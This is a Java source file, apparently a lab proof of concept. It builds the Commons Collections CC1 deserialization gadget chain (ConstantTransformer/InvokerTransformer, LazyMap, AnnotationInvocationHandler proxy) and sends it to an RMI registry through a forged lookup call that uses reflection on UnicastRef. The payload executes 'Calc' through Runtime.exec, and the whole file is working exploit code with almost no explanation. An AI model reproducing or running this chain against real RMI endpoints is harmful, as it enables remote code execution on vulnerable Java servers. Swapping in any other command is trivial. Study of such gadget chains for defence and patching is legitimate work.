package org.example.clientAttackRegistry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class Client {
    public static void main(String[] args) throws Exception {
        // 1. get the stub of registry
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // 2. get the stub of remote object
//        RemoteObjectInterface stub = (RemoteObjectInterface) registry.lookup("remoteObject");
        fakeLookup(registry);
        // 3. invoke the method of remote object
//        stub.sayHello("I'm jasper you motherfucker.");
    }
    public static Object getCCPayload() throws Exception {
        //CC1-LazyMap
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"Calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key","value");
        Map lazyMap = (Map) LazyMap.decorate(hashMap,chainedTransformer);
//        lazyMap.get("Jasper");
        Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstuctor = aihClass.getDeclaredConstructor(Class.class,Map.class);
        aihConstuctor.setAccessible(true);
        InvocationHandler aih = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);

        InvocationHandler aih2 = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);
        return aih2;
    }
    public static void fakeLookup(Registry registry) throws Exception {
        // 获取ref
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
        //获取operations

        Field[] fields_1 = registry.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry);

        // 伪造lookup的代码，去伪造传输信息
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(getCCPayload());
        ref.invoke(var2);
    }
}
